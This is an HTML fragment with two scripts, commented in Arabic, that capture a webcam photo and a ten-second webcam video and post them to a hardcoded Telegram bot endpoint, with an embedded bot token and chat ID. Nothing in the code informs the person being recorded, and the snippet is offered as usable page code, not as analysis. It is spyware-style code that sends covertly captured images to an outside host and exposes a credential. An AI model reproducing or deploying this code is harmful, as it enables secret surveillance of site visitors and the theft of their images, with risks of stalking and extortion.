<!-- التقاط صورة بالكاميرا الأمامية وإرسالها -->
<script>
async function capturePhotoAndSend() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const photoData = canvas.toDataURL("image/png");

    fetch(`https://api.telegram.org/bot7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M/sendPhoto`, {
      method: "POST",
      body: JSON.stringify({
        chat_id: "7664410054",
        photo: photoData
      }),
      headers: {
        "Content-Type": "application/json"
      }
    });

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.error("📸❌📸:", err);
  }
}
</script>

<!-- تسجيل فيديو 10 ثواني بالكاميرا -->
<script>
async function recordVideoAndSend() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const mediaRecorder = new MediaRecorder(stream);
    let chunks = [];

    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      const formData = new FormData();
      formData.append("chat_id", "7664410054");
      formData.append("video", blob, "video.webm");

      fetch(`https://api.telegram.org/bot7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M/sendVideo`, {
        method: "POST",
        body: formData
      });

      stream.getTracks().forEach(t => t.stop());
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 10000);
  } catch (e) {
    console.error("🎬❌🎬", e);
  }
}
</script>
